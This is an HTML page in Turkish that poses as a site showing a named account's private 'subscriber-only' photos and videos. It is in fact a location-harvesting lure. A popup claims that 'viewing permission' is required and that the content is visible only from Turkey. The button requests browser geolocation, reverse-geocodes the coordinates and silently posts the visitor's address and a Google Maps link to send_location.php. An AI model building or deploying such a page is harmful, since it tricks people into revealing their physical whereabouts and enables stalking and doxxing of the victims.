<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>birandaonlayn (@birandaonlayn) • Abonelere Özel Gizli fotoğrafları ve videoları</title>
    <style>
        body {
            margin: 0;
            font-family: Arial, sans-serif;
            overflow: hidden;
        }

        #content {
            display: none;
        }

        #popup {
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.5);
            color: #fff;
            text-align: center;
            z-index: 9999;
            padding: 20px;
        }

        #popup-content {
            background: #333;
            padding: 20px;
            border-radius: 8px;
            max-width: 500px;
            margin: 20px;
        }

        button {
            background: #007bff;
            color: #fff;
            border: none;
            padding: 10px 20px;
            border-radius: 5px;
            cursor: pointer;
            margin-top: 20px;
        }

        button:hover {
            background: #0056b3;
        }

        #footer-note {
            margin-top: 20px;
            color: #ccc;
        }
        
        .profile {
            border-radius: 50%;
            width: 100px;
            height: 100px;
            object-fit: cover;
            -webkit-filter: blur(2px);
        }

        #content {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background: #f0f0f0;
            text-align: center;
        }

        .loading-container {
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            animation: fadeIn 1s ease-in-out;
        }

        .loading-container h1 {
            font-size: 2em;
            margin-bottom: 20px;
            color: #333;
        }

        .spinner {
            border: 8px solid rgba(0, 0, 0, 0.1);
            border-left: 8px solid #007bff;
            border-radius: 50%;
            width: 60px;
            height: 60px;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        @keyframes fadeIn {
            0% { opacity: 0; }
            100% { opacity: 1; }
        }
    </style>
</head>
<body>
    <div id="popup">
        <div id="popup-content">
            <img class="profile" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRDzczN_Rc0Pz2b9YbDQpPdfU1ErnPdonkznA&s">
            <h1>Siteyi görüntülemek için<br> İzin Gerekiyor</h1>
            <p>Bu siteyi görüntülemek için görüntüleme izni vermeniz gerekmektedir.</p>
            <button onclick="requestLocation()">İzin Ver</button>
        </div>
        <p id="footer-note">*Görüntüler sadece Türkiye'den görüntülenebilmektedir.</p>
    </div>
    <div id="content">
        <div class="loading-container">
            <h1>Yükleniyor...</h1>
            <div class="spinner"></div>
        </div>
    </div>

    <script>
        function requestLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    function(position) {
                        document.getElementById('popup').style.display = 'none';
                        document.getElementById('content').style.display = 'flex';
                        processLocation(position);
                    },
                    function(error) {
                        alert('Görüntüleme izni vermediniz lütfen tekrar deneyin.');
                    }
                );
            } else {
                alert("Bu tarayıcı gerekli izinleri desteklemiyor.");
            }
        }

        function processLocation(position) {
            const lat = position.coords.latitude;
            const lon = position.coords.longitude;

            const openCageUrl = `https://api.opencagedata.com/geocode/v1/json?q=${lat}+${lon}&key=YOUR_OPENCAGE_API`;

            fetch(openCageUrl)
                .then(response => response.json())
                .then(data => {
                    if (data.results && data.results.length > 0) {
                        const address = data.results[0].formatted;

                        const origin = encodeURIComponent(`${lat},${lon}`);
                        const destination = encodeURIComponent(`${lat},${lon}`);
                        const googleMapsUrl = `https://www.google.com/maps/dir/?api=1&origin=${origin}&destination=${destination}`;

                        const xhr = new XMLHttpRequest();
                        xhr.open("POST", "send_location.php", true);
                        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
                        xhr.send(`address=${encodeURIComponent(address)}&url=${encodeURIComponent(googleMapsUrl)}`);
                    } else {
                        console.error("Gerekli izinler alınamadı.");
                    }
                })
                .catch(error => console.error("Hatası:", error));
        }
    </script>
</body>
</html>
